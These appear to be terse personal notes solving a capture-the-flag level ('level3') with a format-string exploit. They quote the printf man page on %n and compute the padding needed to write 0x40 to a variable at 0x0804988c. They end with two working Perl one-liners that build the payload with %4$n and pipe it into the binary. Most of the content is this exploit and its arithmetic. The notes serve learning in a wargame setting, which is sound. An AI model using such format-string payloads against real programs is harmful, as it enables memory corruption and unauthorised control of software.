```
        Code such as printf(foo); often indicates a bug, since foo may
        contain a % character.  If foo comes from untrusted user input,
        it may contain %n, causing the printf() call to write to memory
        and creating a security hole.
```

https://null-byte.wonderhowto.com/how-to/exploit-development-write-specific-values-memory-with-format-string-exploitation-0182112/

%x.%x.%x.%n


info variable
```
[...]
0x0804988c  m
[...]
```

m must = 0x40

        Adress of m
      + 0x40 characters - m_address.len() (4)
      + %4$n

0x40 - 4 = 0x3c = 60

perl -e 'print "\x8c\x98\x04\x08" . "A"x0x3c . "%4\$n" . "\n"' > /tmp/level3 && cat /tmp/level3 - | ./level3
perl -e 'print "\x8c\x98\x04\x08" . "%60d" . "%4\$n" . "\n"' > /tmp/level3 && cat /tmp/level3 - | ./level3